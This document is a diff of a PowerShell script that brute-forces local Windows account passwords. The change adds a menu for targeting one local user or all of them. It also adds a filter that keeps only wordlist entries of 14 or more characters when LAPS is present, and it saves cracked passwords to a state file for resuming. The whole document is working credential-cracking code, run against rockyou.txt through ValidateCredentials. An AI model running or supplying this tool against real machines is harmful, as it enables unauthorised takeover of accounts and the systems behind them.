@@ -8,6 +8,7 @@ Function CheckLAPS {
         
         $continue = Read-Host "Do you want to continue anyway? (Type 'Y' for Yes or 'N' for No)"
         $continue = $continue.ToUpper()
+        $Laps = $true
         if ($continue -ne 'Y') {
             exit
         }
@@ -16,57 +17,99 @@ Function CheckLAPS {
     }
 }
 
+Function Get-LocalUserList {
+    # Retrieve the list of local users
+    $localUsers = Get-LocalUser | Select-Object -ExpandProperty Name
+    $localUsers += "ALL" # Add the "ALL" option
+
+    # Display the interactive menu to choose a user
+    Write-Host "Select a local user:"
+    for ($i = 0; $i -lt $localUsers.Count; $i++) {
+        Write-Host "$($i + 1) - $($localUsers[$i])"
+    }
+
+    # Get the user's choice
+    do {
+        $choice = Read-Host "Enter the number corresponding to the user (or type 'ALL' for all users):"
+        if ([string]::IsNullOrWhiteSpace($choice)) {
+            Write-Host "Invalid choice. Please choose a valid option or type 'ALL' for all users."
+        }
+    } while ([string]::IsNullOrWhiteSpace($choice))
+
+    # Check if the choice is valid
+    if ($choice -eq "ALL" -or ($choice -ge 1 -and $choice -le $localUsers.Count)) {
+        if ($choice -eq "ALL") {
+            $localUsers # Return all users if "ALL" is chosen
+        } else {
+            $localUsers[$choice - 1] # Return the chosen user
+        }
+    } else {
+        Write-Host "Invalid choice. Please choose a valid option or type 'ALL' for all users."
+        return $null
+    }
+}
+
 Function localbrute {
- 
     param($u, $dct, $debug)
     CheckLAPS
-    $name = Get-LocalUser | Select-Object -ExpandProperty Name
-    $userExists = $false
-    foreach($i in $name) {
-        if ($i -eq $u) {
-            $userExists = $true
-            Write-Output "User $i exists among local users."
+
+    # List of users with multiple choice including ALL
+    $userChoice = Get-LocalUserList
+    if ($userChoice -eq $null) {
+        return
+    }
+
+    if ($userChoice -eq "ALL") {
+        # Process all local users
+        $localUsers = Get-LocalUser | Select-Object -ExpandProperty Name
+    } else {
+        $localUsers = $userChoice
+    }
+
+    foreach ($u in $localUsers) {
+        # Your logic for brute-forcing for each user
+        Write-Output "Bruteforcing for user: $u"
+
+        $d = $dct -replace ".*\\" -replace ".*/"
+
+        $index = (Get-Content .\localbrute.state | Where-Object { $_ -match "^${u}:${d}:" } | Select-Object -Last 1 -ErrorAction SilentlyContinue) -split ":" | Select-Object -Index 2
+        if ($index) {
+            Write-Output "Password for $u account already found: $index"
+            return
         }
-    }
 
-    if (-not $userExists) {
-        Write-Output "User $u does not exist among local users."
-        return
-    }
+        $index = 0
 
-    $d = $dct -replace ".*\\" -replace ".*/"
+        $dictionary = [System.IO.File]::ReadLines($dct)
 
-    $index = (Get-Content .\localbrute.state | Where-Object { $_ -match "^${u}:${d}:" } | Select-Object -Last 1 -ErrorAction SilentlyContinue) -split ":" | Select-Object -Index 2
-    if ($index) {
-        Write-Output "Password for $u account already found: $index"
-        return
-    }
+        # Check if LAPS = true, if true then choose passwords of +14 characters
+        if ($Laps) {
+            $dictionary = $dictionary | Where-Object { $_.Length -ge 14 }
+        }
 
-    $index = 0
+        $dictionary | ForEach-Object -Begin { $i = 0 } -Process {
+            $password = $_
+            if ($i -ge $index) {
+                if ($debug) {Write-Output "DEBUG: trying password for $u [${i}]: $password" }
+                try {
+                    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+                    $contextType = [DirectoryServices.AccountManagement.ContextType]::Machine
+                    $principalContext = [DirectoryServices.AccountManagement.PrincipalContext]::new($contextType)
+                    if ($principalContext.ValidateCredentials($u, $password)) {
+                        Write-Output "${u}:${d}:True:${password}" >> localbrute.state
+                        Write-Output "Password for $u account found: $password"
+                        break
+                    }
+                } catch {
 
-    $dictionary = [System.IO.File]::ReadLines($dct)
-
-    $dictionary | ForEach-Object -Begin { $i = 0 } -Process {
-        $password = $_
-        if ($i -ge $index) {
-            if ($debug) { Write-Output "DEBUG: trying password [${i}]: $password" }
-            try {
-                Add-Type -AssemblyName System.DirectoryServices.AccountManagement
-                $contextType = [DirectoryServices.AccountManagement.ContextType]::Machine
-                $principalContext = [DirectoryServices.AccountManagement.PrincipalContext]::new($contextType)
-                if ($principalContext.ValidateCredentials($u, $password)) {
-                    Write-Output "${u}:${d}:True:${password}" >> localbrute.state
-                    Write-Output "Password for $u account found: $password"
-                    break
                 }
-            } catch {
-
             }
+            $i++
         }
-        $i++
-    }
 
-    Write-Output "${u}:${d}:${i}:${password}" >> localbrute.state
+        Write-Output "${u}:${d}:${i}:${password}" >> localbrute.state
+    }
 }
-# Exemple localbrute -u "admin" -dct "rockyou.txt" $true
-localbrute -u "" -dct "" -debug $true
+
+# Example of calling localbrute function
+localbrute -u "" -dct "rockyou.txt" -debug $true
